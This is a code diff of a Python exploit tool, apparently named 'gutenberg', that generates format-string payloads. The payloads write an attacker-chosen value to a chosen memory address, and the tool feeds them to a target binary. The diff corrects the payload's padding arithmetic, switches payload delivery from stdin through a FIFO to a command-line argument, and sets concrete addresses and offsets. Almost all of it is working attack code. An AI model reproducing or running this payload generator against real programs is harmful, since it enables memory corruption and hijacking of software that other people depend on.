@@ -7,8 +7,9 @@
 
 from os import access, X_OK, mkfifo
 from os.path import realpath, isfile
-from argparse import ArgumentParser
+from math import log
 from signal import signal, SIGINT
+from argparse import ArgumentParser
 from subprocess import call
 from multiprocessing import Process
 
@@ -36,26 +37,28 @@ FIFO = "/tmp/gutenberg"
 
 def generate_payload(where_to_write, offset, what_to_write, fmt, chr_padd):
     nba2hx = lambda x: ''.join(map(chr, (x & 255, (x >> 8) & 255, (x >> 16) & 255, x >> 24)))
-    # thoses calculs doesn't work yet
-    pw1 = (what_to_write & ((255 << 8) + 255)) - 37
+    pw1 = (what_to_write & ((255 << 8) + 255)) - 8
     _pw = what_to_write >> 16
-    pw2 = 65536 * (_pw < pw1) + _pw - pw1 - 37
-    print(pw1, pw2)
-    payload = "{}{}AAAA%{:05d}x%{:d}${:s}%{:05d}x%{:d}${:s}".format(nba2hx(where_to_write),
-                                                                    nba2hx(where_to_write + 2),
-                                                                    pw1, offset, fmt,
-                                                                    pw2, offset + 1, fmt) + " " * chr_padd
-    print(len(payload))
+    pw2 = 65536 * (_pw <= pw1) + _pw - pw1 - 8
+    payload = "{}{}%{:05d}x%{:d}${:s}%{:05d}x%{:d}${:s}".format(nba2hx(where_to_write),
+                                                                nba2hx(where_to_write + 2),
+                                                                pw1, offset, fmt,
+                                                                pw2, offset + 1, fmt) + " " * chr_padd
     return payload
 
 
-def exec_cmd(binary, cmd):
-    def _exec():
-        call([realpath(binary)], stdin=open(FIFO, 'r'))
-        pass
-    Process(target=_exec).start()
-    print(cmd, file=open(FIFO, 'w'))
-    return
+# def exec_cmd_stdin(binary, cmd):
+#     def _exec():
+#         call([realpath(binary)], stdin=open(FIFO, 'r'))
+#         pass
+#     Process(target=_exec).start()
+#     print(cmd, file=open(FIFO, 'w'))
+#     return
+
+
+def exec_cmd_args(binary, cmd):
+    call([realpath(binary), cmd])
+    pass
 
 
 def check(binary):
@@ -66,9 +69,9 @@ def check(binary):
 
 
 def analyze(binary):
-    where_to_write = 0xdeadbeef
-    offset = 10
-    what_to_write = 0xcafebabe
+    where_to_write = 0xfffffc8c
+    offset = 161
+    what_to_write = 0x0eadbeef
     chr_padd = 0
     payload = generate_payload(where_to_write, offset, what_to_write, FMT_CHECK, chr_padd)
 
@@ -79,7 +82,7 @@ def analyze(binary):
         print(oe)
         exit(1)
 
-    exec_cmd(binary, payload)
+    exec_cmd_args(binary, payload)
     pass
 
 
